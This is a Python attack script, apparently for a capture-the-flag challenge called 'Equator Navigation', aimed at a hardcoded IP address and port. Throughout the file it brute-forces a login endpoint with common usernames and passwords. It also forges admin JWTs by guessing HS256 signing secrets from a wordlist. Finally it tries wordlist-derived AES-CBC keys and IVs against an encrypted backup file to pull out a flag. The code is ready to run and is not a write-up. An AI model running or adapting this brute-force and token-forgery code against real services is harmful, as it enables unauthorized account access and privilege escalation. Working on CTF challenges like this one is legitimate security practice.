#!/usr/bin/env python3
"""
Aggressive bruteforce for Equator Navigation
"""

import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import itertools

TARGET_URL = "http://138.199.163.92:12973/"

def massive_jwt_bruteforce():
    """Massive JWT secret bruteforce"""
    print("="*60)
    print("MASSIVE JWT BRUTEFORCE")
    print("="*60)
    
    session = requests.Session()
    
    # Build comprehensive wordlist
    base_words = [
        # Geohash related
        "s000", "s0000", "s00000", "s000000", "s0000000", "s00000000",
        "u000", "u0000", "u00000",
        "7zzz", "pbpb", "gbpb",
        
        # Location related
        "nullisland", "null", "island", "equator", "meridian",
        "primemeridian", "prime", "latitude", "longitude",
        "coordinates", "geohash", "navigation", "system",
        "atlantic", "ocean", "guinea", "gulf",
        
        # Numbers and coordinates
        "0", "00", "000", "0000", "00000",
        "0.0", "0,0", "00", "0-0",
        
        # Common passwords
        "admin", "password", "secret", "key", "flag",
        "123456", "password123", "admin123",
        
        # Challenge specific
        "equatornavigation", "nullislandmonitoring",
        "geohashpuzzle", "transmission", "encrypted",
        "v3", "v3.0", "2025", "debug",
        
        # Combinations
        "admin_s000", "s000_admin", "nullisland_s000",
        "geohash_s000", "equator_s000",
    ]
    
    # Add variations
    secrets = set(base_words)
    
    # Add uppercase/lowercase variations
    for word in base_words[:20]:  # Limit to avoid explosion
        secrets.add(word.upper())
        secrets.add(word.lower())
        secrets.add(word.capitalize())
    
    # Add with underscores
    for w1, w2 in itertools.combinations(["null", "island", "s000", "admin", "geohash"], 2):
        secrets.add(f"{w1}_{w2}")
        secrets.add(f"{w1}{w2}")
    
    print(f"[*] Testing {len(secrets)} secrets...")
    
    payload = {"role": "admin"}
    
    count = 0
    for secret in secrets:
        count += 1
        if count % 50 == 0:
            print(f"    Tested {count}/{len(secrets)}...")
        
        try:
            token = jwt.encode(payload, secret, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}
            
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=3)
            
            if resp.status_code == 200:
                print(f"\n[!!!] FOUND SECRET: {secret}")
                print(f"[!!!] TOKEN: {token}")
                print(f"\nResponse:")
                print(resp.text)
                
                if 'kaal{' in resp.text.lower():
                    import re
                    flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                    if flag:
                        print(f"\n[!!!] FLAG: {flag.group(0)}")
                        return flag.group(0)
                return resp.text
        except:
            pass
    
    print("[-] No valid secret found")
    return None

def massive_aes_bruteforce():
    """Massive AES key bruteforce"""
    print("\n" + "="*60)
    print("MASSIVE AES BRUTEFORCE")
    print("="*60)
    
    try:
        with open('backup.bin', 'rb') as f:
            data = f.read()
    except:
        print("[-] backup.bin not found")
        return None
    
    # Same wordlist
    key_strings = [
        "s000", "s0000", "s00000", "s000000", "s0000000", "s00000000",
        "u000", "u0000", "nullisland", "geohash", "equator",
        "admin", "secret", "key", "flag", "password",
        "nullisland_s000", "geohash_s000", "equator_s000",
        "primemeridian", "latitude", "longitude",
        "0", "00", "000", "0000",
    ]
    
    print(f"[*] Testing {len(key_strings)} keys...")
    
    for key_str in key_strings:
        # Try different key derivations
        keys = [
            hashlib.sha256(key_str.encode()).digest(),
            hashlib.md5(key_str.encode()).digest() * 2,
            hashlib.sha256(key_str.encode()).digest()[:32],
            key_str.encode().ljust(32, b'\x00'),
        ]
        
        # Try different IVs
        ivs = [
            b'\x00' * 16,
            hashlib.md5(key_str.encode()).digest(),
            hashlib.sha256(key_str.encode()).digest()[:16],
        ]
        
        for key in keys:
            for iv in ivs:
                try:
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted = cipher.decrypt(data)
                    
                    try:
                        unpadded = unpad(decrypted, 16)
                        text = unpadded.decode('utf-8', errors='ignore')
                        
                        if 'kaal{' in text.lower():
                            print(f"\n[!!!] FOUND KEY: {key_str}")
                            print(f"[!!!] DECRYPTED: {text}")
                            return text
                        
                        # Check if mostly printable
                        if len(unpadded) > 10 and sum(32 <= b < 127 for b in unpadded) / len(unpadded) > 0.8:
                            print(f"\n[*] Possible key: {key_str}")
                            print(f"    Text: {text}")
                    except:
                        pass
                except:
                    pass
    
    print("[-] No valid key found")
    return None

def try_login_bruteforce():
    """Try login with common credentials"""
    print("\n" + "="*60)
    print("LOGIN BRUTEFORCE")
    print("="*60)
    
    session = requests.Session()
    
    usernames = ["admin", "root", "user", "geohash", "nullisland", "equator", "administrator"]
    passwords = [
        "s000", "s0000", "s00000", "nullisland", "geohash",
        "admin", "password", "123456", "equator", "meridian",
        "0", "00", "000", "0.0", "0,0",
    ]
    
    print(f"[*] Testing {len(usernames) * len(passwords)} combinations...")
    
    for username in usernames:
        for password in passwords:
            try:
                resp = session.post(
                    TARGET_URL + 'login',
                    json={"username": username, "password": password},
                    timeout=3
                )
                
                if resp.status_code == 200:
                    print(f"\n[!!!] LOGIN SUCCESS!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print(f"    Response: {resp.text}")
                    
                    try:
                        data = resp.json()
                        if 'token' in data:
                            token = data['token']
                            
                            # Try admin endpoint
                            headers = {"Authorization": f"Bearer {token}"}
                            resp2 = session.get(TARGET_URL + 'admin', headers=headers)
                            print(f"\n[+] Admin response: {resp2.status_code}")
                            print(resp2.text)
                            
                            if 'kaal{' in resp2.text.lower():
                                import re
                                flag = re.search(r'Kaal\{[^}]+\}', resp2.text, re.IGNORECASE)
                                if flag:
                                    return flag.group(0)
                    except:
                        pass
            except:
                pass
    
    print("[-] No valid credentials found")
    return None

def main():
    print("AGGRESSIVE BRUTEFORCE FOR EQUATOR NAVIGATION")
    print()
    
    # Try login first (fastest)
    result = try_login_bruteforce()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG FOUND: {result}")
        print(f"{'='*60}")
        return
    
    # Try JWT bruteforce
    result = massive_jwt_bruteforce()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG FOUND: {result}")
        print(f"{'='*60}")
        return
    
    # Try AES bruteforce
    result = massive_aes_bruteforce()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG FOUND: {result}")
        print(f"{'='*60}")
        return
    
    print("\n" + "="*60)
    print("EXHAUSTED ALL OPTIONS")
    print("="*60)

if __name__ == "__main__":
    main()
